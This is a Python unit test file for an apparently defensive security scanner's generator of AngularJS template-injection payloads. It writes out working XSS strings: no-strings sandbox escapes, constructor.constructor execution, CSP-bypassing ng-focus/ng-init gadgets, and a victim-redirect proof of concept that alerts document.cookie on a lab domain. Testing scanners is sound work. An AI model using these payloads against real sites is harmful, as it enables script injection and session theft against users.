"""Unit tests for the pure AngularJS CSTI synthesis grammar/builders (no browser).

These assert that, given which primitives verified, the builders assemble the correct composed
expression — and that the no-strings builder reproduces the published 1.4 vector exactly (so
synthesis is provably equivalent to the curated cheat-sheet form, not a lookup)."""

from __future__ import annotations

from dast.payloads.loader import get_value
from dast.triage import xss_synthesis as synth


def test_char_codes_for_x_assign_alert():
    # x=alert(1) → the exact fromCharCode sequence the published 1.4 no-strings vector carries.
    assert synth.char_codes("x=alert(1)") == [120, 61, 97, 108, 101, 114, 116, 40, 49, 41]


def test_fromcharcode_expr_builds_without_literals():
    expr = synth.fromcharcode_expr("x=alert(1)")
    assert expr == ("toString().constructor.fromCharCode("
                    "120,61,97,108,101,114,116,40,49,41)")
    assert '"' not in expr and "'" not in expr  # no string literal anywhere


def test_effect_string_wraps_assignment():
    assert synth.effect_string("alert(1)") == "x=alert(1)"
    assert synth.effect_string("alert(424242)") == "x=alert(424242)"


def test_charat_payload_key_delivery_matches_published_vector():
    # The synthesized escape must equal the curated angular_no_strings 1.4 vector verbatim.
    built = synth.charat_payload("alert(1)", key_delivery=True)
    stored = (get_value("xss", "angular_no_strings", {}) or {})["1.4"][0]
    assert built == stored
    assert built == (
        "toString().constructor.prototype.charAt=[].join;"
        "[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"
    )


def test_charat_payload_value_delivery_drops_key_suffix():
    value = synth.charat_payload("alert(1)", key_delivery=False)
    assert value.endswith("fromCharCode(120,61,97,108,101,114,116,40,49,41)")
    assert not value.endswith("=1")
    # Same escape structure, just without the trailing KEY→value separator.
    assert value + "=1" == synth.charat_payload("alert(1)", key_delivery=True)


def test_charat_payload_uses_mark_in_codes():
    # alert(777) → codes include 55,55,55 (three '7') inside the x=alert(...) string.
    built = synth.charat_payload("alert(777)", key_delivery=True)
    codes = synth.char_codes("x=alert(777)")
    assert ",".join(str(c) for c in codes) in built


def test_constructor_payload_with_and_without_strings():
    with_strings = synth.constructor_payload("alert(1)", strings_ok=True)
    assert with_strings == "constructor.constructor('alert(1)')()"

    no_strings = synth.constructor_payload("alert(1)", strings_ok=False)
    assert no_strings == ("constructor.constructor("
                          "toString().constructor.fromCharCode(97,108,101,114,116,40,49,41))()")
    assert "'" not in no_strings and '"' not in no_strings


def test_oracle_and_primitive_probes():
    assert synth.oracle_probe() == ("7*7", "49")

    fc_expr, fc_exp = synth.fromcharcode_probe()
    assert fc_exp == synth.SENTINEL_STR
    assert fc_expr == synth.fromcharcode_expr(synth.SENTINEL_STR)

    c_expr, c_exp = synth.constructor_probe()
    assert c_exp == synth.SENTINEL_STR
    assert c_expr.startswith("constructor.constructor(")
    assert "fromCharCode(" in c_expr  # code body built without a literal
    assert '"' not in c_expr

    ch_expr, ch_exp = synth.charat_probe()
    assert ch_exp == synth.SENTINEL_STR
    assert ch_expr.startswith("toString().constructor.prototype.charAt=[].join;")
    assert ch_expr.endswith(synth.fromcharcode_expr(synth.SENTINEL_STR))


def test_primitives_fall_back_to_defaults(monkeypatch):
    # A trimmed library (angular_primitives absent) must not break synthesis — defaults apply.
    import dast.triage.xss_synthesis as mod
    real = mod.get_value

    def fake(category, key, default=None):
        if (category, key) == ("xss", "angular_primitives"):
            return {}
        return real(category, key, default)

    monkeypatch.setattr(mod, "get_value", fake)
    assert mod.charat_payload("alert(1)", key_delivery=True) == (
        "toString().constructor.prototype.charAt=[].join;"
        "[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"
    )


# ── AngularJS HTML-element directive gadget (CSTI under CSP) builders ─────────

def test_orderby_alert_expr_is_quote_free_with_numeric_arg():
    # The orderBy/composedPath gadget fires alert(<MARK>); the MARK is numeric so the only quotes
    # are the single quotes wrapping the orderBy string predicate (no nested/double quotes).
    expr = synth.orderby_alert_expr("424242")
    assert expr == "$event.composedPath()|orderBy:'(z=alert)(424242)'"
    assert '"' not in expr  # safe inside a double-quoted ng-focus="..." attribute


def test_html_directive_payload_rides_autofocus_ng_focus():
    built = synth.html_directive_payload("777", trigger="ng-focus")
    assert built == (
        '<input id=x autofocus ng-focus="$event.composedPath()|orderBy:\'(z=alert)(777)\'">')
    # The MARK appears as the alert argument, so the dialog will echo it.
    assert "(z=alert)(777)" in built


def _decode_fromcharcode(s: str) -> str:
    import re
    m = re.search(r"fromCharCode\(([\d,]+)\)", s)
    assert m, f"no fromCharCode in {s!r}"
    return "".join(chr(int(c)) for c in m.group(1).split(",") if c)


def test_ng_init_alert_expr_is_event_free():
    # ng-init runs at LINK time with NO $event, so its escape must NOT reference $event. It reuses
    # the increment-1 no-strings charAt/fromCharCode escape building x=alert(<arg>).
    expr = synth.ng_init_alert_expr("777")
    assert "$event" not in expr
    assert "composedPath" not in expr
    assert '"' not in expr  # safe inside a double-quoted ng-init="..." attribute
    assert expr.startswith("toString().constructor.prototype.charAt=[].join;[1]|orderBy:")
    # The fromCharCode codes decode to the x=alert(<arg>) assignment the orderBy trigger evaluates.
    assert _decode_fromcharcode(expr) == "x=alert(777)"


def test_ng_init_setter_expr_is_event_free_window_name():
    # The ng-init compile/fire oracle sets window.name via the SAME event-free escape (no alert).
    expr = synth.ng_init_setter_expr("9777")
    assert "$event" not in expr
    assert "alert" not in expr
    assert _decode_fromcharcode(expr) == "x=name=9777"


def test_html_directive_payload_ng_init_is_event_free():
    # The ng-init gadget rides ng_init_seed (no autofocus) and carries the EVENT-FREE escape — it
    # must NOT contain the $event.composedPath() gadget (which would throw at link time).
    built = synth.html_directive_payload("777", trigger="ng-init")
    assert built.startswith('<input id=x ng-init="')
    assert "autofocus" not in built
    assert "$event" not in built
    assert "(z=alert)" not in built
    assert _decode_fromcharcode(built) == "x=alert(777)"


def test_html_sentinel_payload_ng_init_is_event_free_window_name():
    built = synth.html_sentinel_payload("9777", trigger="ng-init")
    assert built.startswith('<input id=x ng-init="')
    assert "$event" not in built
    assert "alert" not in built
    assert _decode_fromcharcode(built) == "x=name=9777"


def test_html_directive_payload_matches_curated_vector():
    # The synthesized ng-focus gadget must equal the curated angular_html_directive 1.4 seed
    # (with {MARK} filled), so synthesis is provably the same grammar, not a divergent form.
    built = synth.html_directive_payload("424242", trigger="ng-focus")
    stored = (get_value("xss", "angular_html_directive", {}) or {})["1.4"][0]
    assert built == stored.replace("{MARK}", "424242")


def test_html_sentinel_payload_sets_window_name():
    # The compile/fire oracle element sets window.name to the numeric sentinel (no alert).
    built = synth.html_sentinel_payload("9777", trigger="ng-focus")
    assert built == (
        '<input id=x autofocus ng-focus="$event.composedPath()|orderBy:\'(z=(name=9777))\'">')
    assert "alert" not in built


def test_html_sandbox_probe_is_scope_safe():
    expr, expected = synth.html_sandbox_probe()
    assert expr == "[1]|orderBy:'(z=toString)()'"
    assert expected == "1"
    assert "$event" not in expr  # evaluable through the app's $parse without a DOM event


def test_html_primitives_fall_back_to_defaults(monkeypatch):
    import dast.triage.xss_synthesis as mod
    real = mod.get_value

    def fake(category, key, default=None):
        if (category, key) == ("xss", "angular_html_primitives"):
            return {}
        return real(category, key, default)

    monkeypatch.setattr(mod, "get_value", fake)
    assert mod.html_directive_payload("777", trigger="ng-focus") == (
        '<input id=x autofocus ng-focus="$event.composedPath()|orderBy:\'(z=alert)(777)\'">')


def test_exploit_server_gadget_is_fragment_focus_form():
    # The raw element the exploit-server PoC injects: id=x + ng-focus composedPath/orderBy gadget,
    # NO autofocus (the victim focuses it via the #x fragment), arg = document.cookie.
    gadget = synth.exploit_server_gadget()
    assert gadget == (
        "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>")
    assert "autofocus" not in gadget
    assert "ng-focus" in gadget and "composedPath" in gadget and "orderBy" in gadget


def test_exploit_server_poc_builder_root_path():
    # Given a target lab origin + injection point, build the exact copy-paste exploit-server PoC:
    # <script>location='<origin>/?<point>=<gadget>#x';</script> — mirrors the PortSwigger solution.
    poc = synth.exploit_server_poc("https://lab.example.net/", "search")
    assert poc == (
        "<script>location='https://lab.example.net/?search="
        "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>"
        "#x';</script>")
    # Load-bearing pieces are present and the focus fragment trails the gadget.
    assert "ng-focus" in poc and "composedPath" in poc and "orderBy" in poc
    assert poc.endswith("#x';</script>")


def test_exploit_server_poc_builder_preserves_path_and_point():
    # Built from the ACTUAL target URL + point: a non-root path is kept; an existing query is dropped
    # (the gadget owns the injection point), and the trailing #x focus fragment is appended.
    poc = synth.exploit_server_poc("https://app.example.com/app/search?q=1", "q")
    assert poc.startswith("<script>location='https://app.example.com/app/search?q=<input id=x ")
    assert poc.endswith("#x';</script>")
